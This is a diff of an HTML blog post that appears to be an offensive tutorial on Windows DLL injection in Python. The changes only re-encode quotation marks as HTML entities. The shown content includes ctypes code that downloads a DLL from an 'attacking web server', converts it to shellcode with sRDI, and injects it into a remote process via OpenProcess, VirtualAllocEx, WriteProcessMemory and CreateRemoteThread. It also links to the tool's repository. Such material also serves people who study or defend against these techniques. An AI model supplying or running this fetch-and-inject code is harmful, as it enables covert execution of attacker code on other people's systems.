@@ -160,7 +160,7 @@
 <li>LoadLibraryA()</li>
 <li>CreateRemoteThread(), NtCreateThreadEx, etc.</li>
 </ul>
-<p>There are a few options when it comes to executing our DLL. For this post, I will use CreateRemoteThread(). The problem is, we can&rsquo;t simply give the names of our DLL to these functions. We have to provide a memory address to start the execution. We will perform the allocate and copy steps to obtain space within the remote process' memory.</p>
+<p>There are a few options when it comes to executing our DLL. For this post, I will use CreateRemoteThread(). The problem is, we can&rsquo;t simply give the names of our DLL to these functions. We have to provide a memory address to start the execution. We will perform the allocate and copy steps to obtain space within the remote process&rsquo; memory.</p>
 <p>In order to load DLLs or executables, we will use LoadLibraryA() to take a filename as its parameter and do magical things.</p>
 <h1 id="downloading-the-dll">Downloading the DLL</h1>
 <p>First, we&rsquo;ll create a function that will download the DLL from our attacking web server and write it to disk.</p>
@@ -198,9 +198,9 @@ GetProcAddress.argtypes = (ctypes.wintypes.HANDLE, LPCTSTR)
 GetProcAddress.restype = ctypes.wintypes.LPVOID
 
 class _SECURITY_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [('nLength', ctypes.wintypes.DWORD),
-                ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
-                ('bInheritHandle', ctypes.wintypes.BOOL)]
+    _fields_ = [(&#39;nLength&#39;, ctypes.wintypes.DWORD),
+                (&#39;lpSecurityDescriptor&#39;, ctypes.wintypes.LPVOID),
+                (&#39;bInheritHandle&#39;, ctypes.wintypes.BOOL)]
 
 SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
 LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
@@ -265,26 +265,26 @@ Then we can use GetModuleHandle to retrieve a module handle to a specified modul
 <p>In this post, we will convert our DLL into shellcode and then inject it into a remote process. We can use the function ConvertToShellcode from <a href="https://github.com/monoxgas/sRDI">here</a>.</p>
 <pre tabindex="0"><code>from ShellcodeRDI import *
 
-dll = open(&quot;TestDLL_x86.dll&quot;, 'rb').read()
+dll = open(&#34;TestDLL_x86.dll&#34;, &#39;rb&#39;).read()
 shellcode = ConvertToShellcode(dll)
 </code></pre><p>Now we need to take this shellcode and inject it into a remote process. This can be done with a shellcode runner but we&rsquo;ll need to modify it to use OpenProcess() and other APIs to interact with a remote process.</p>
 <pre tabindex="0"><code>def method2(url, pid):
-    dll = urllib.request.urlopen(url, 'rb').read()
+    dll = urllib.request.urlopen(url, &#39;rb&#39;).read()
     shellcode = ConvertToShellcode(dll)
 
     handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-    print(&quot;[+] Obtaining handle...&quot;)
+    print(&#34;[+] Obtaining handle...&#34;)
     time.sleep(2)
 
     memory = VirtualAllocEx(handle, False, len(shellcode) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
-    print(&quot;[+] Allocating memory in remote process...&quot;)
+    print(&#34;[+] Allocating memory in remote process...&#34;)
     time.sleep(2)
 
     write = WriteProcessMemory(handle, memory, shellcode, len(shellcode) + 1, None)
-    print(&quot;[+] Writing payload into process memory...&quot;)
+    print(&#34;[+] Writing payload into process memory...&#34;)
     time.sleep(2)
 
-    print(&quot;[+] Execution completed.&quot;)
+    print(&#34;[+] Execution completed.&#34;)
 
     rthread = CreateRemoteThread(handle, None, 0, memory, None, EXECUTE_IMMEDIATELY, None)
 </code></pre><p><a href="https://github.com/momo1239/buffdawg">Link to the code on github</a></p>
